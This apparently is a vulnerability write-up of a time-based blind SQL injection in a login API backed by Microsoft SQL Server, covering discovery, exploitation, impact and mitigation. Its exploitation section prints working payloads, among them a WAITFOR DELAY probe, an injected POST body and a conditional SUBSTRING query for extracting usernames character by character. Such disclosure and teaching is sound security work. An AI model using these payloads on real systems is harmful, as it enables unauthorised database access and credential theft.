# 🛡️ Blind SQL Injection → Time-Based Data Extraction 🛡️  
**Category:** 🗄️ Web Security | 💉 SQL Injection | ⚠️ Critical Injection Flaw  
**Case Type:** Blind SQLi (Time-Based) | Improper Input Handling

---

## 📝 1. Executive Summary
A critical **Blind SQL Injection vulnerability** was identified across multiple API endpoints. The application failed to sanitize or parameterize user input, allowing injection into backend SQL queries. Using **time-based techniques**, it was possible to extract sensitive data, including user credentials.

> **Key Insight:** The backend directly embedded user-controlled input into SQL queries without validation, enabling full database compromise through blind extraction techniques.

---

## 🎯 2. Target Overview
- **Application Type:** Web / API-based application  
- **Backend:** Microsoft SQL Server  
- **Entry Point:** API endpoints accepting user input in request body  
- **Testing Method:** Intercepting and modifying API requests  

---

## 🔍 3. Discovery Phase

### Initial Observation
- Multiple API endpoints accepted parameters in request body  
- No visible filtering or validation  
- Suspicion of injection due to:
  - Direct parameter usage  
  - Inconsistent responses  

---

### Testing Approach
- Injected basic payloads into parameters  
- Observed delay-based responses instead of errors  

Example payload:
```
'; WAITFOR DELAY '0:0:5'--
```

---

### Result
- Server response delayed by ~5 seconds  
- Confirmed **time-based blind SQL injection**

---

## ⚠️ 4. Vulnerability Details

### Root Cause
- No input sanitization  
- No parameterized queries  
- Direct concatenation of user input into SQL queries  

### Vulnerability Type
**Blind SQL Injection (Time-Based)**

---

### Technical Explanation
The backend likely executes queries similar to:
```
SELECT * FROM users WHERE username = '<user_input>'
```

Injected payload modifies execution:
```
'; WAITFOR DELAY '0:0:5'--
```

This forces the database to pause execution, confirming injection.

---

## 🚀 5. Exploitation

### Step 1: Identify Injection Point
Example request:
```
POST /api/login
{
"username": "test",
"password": "test"
}
```

---

### Step 2: Inject Time-Based Payload
```
POST /api/login
{
"username": "test'; WAITFOR DELAY '0:0:5'--",
"password": "test"
}
```

---

### Step 3: Confirm Injection
- Response delayed by 5 seconds  
- Confirms injectable parameter  

---

### Step 4: Data Extraction (Blind)

Example logic:
- Check first character of username
```
'; IF (SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a') WAITFOR DELAY '0:0:5'--
```

---

### Step 5: Extract Credentials
Using iterative payloads:
- Extracted:
  - First user's username  
  - Password (likely hashed or plain depending on implementation)

---

## 🐚 6. Impact

### Severity: Critical

### Data Exposure:
- User credentials (username + password)  
- Full database access possible  
- Potential admin account compromise  

### Risks:
- Account takeover  
- Data breach  
- Privilege escalation  
- Full system compromise  

---

## 📊 7. Proof of Concept (PoC)

1. Intercept API request  
2. Inject time-based payload  
3. Observe delay  
4. Use conditional queries to extract data  
5. Reconstruct sensitive information character by character  

---

## 🔐 8. Mitigation

- Use **parameterized queries / prepared statements**
- Implement input validation and sanitization  
- Use ORM frameworks where possible  
- Apply least privilege to database users  
- Enable:
  - WAF rules for SQLi detection  
  - Logging and monitoring  

---

## 🛠️ Tools Used
- Burp Suite  
- Manual payload crafting  
- Time-based analysis  

---

## 🧠 Notes / Learnings
- Blind SQLi is slower but extremely powerful  
- Time-based payloads are reliable when errors are suppressed  
- Always test every parameter — injection points are often widespread  
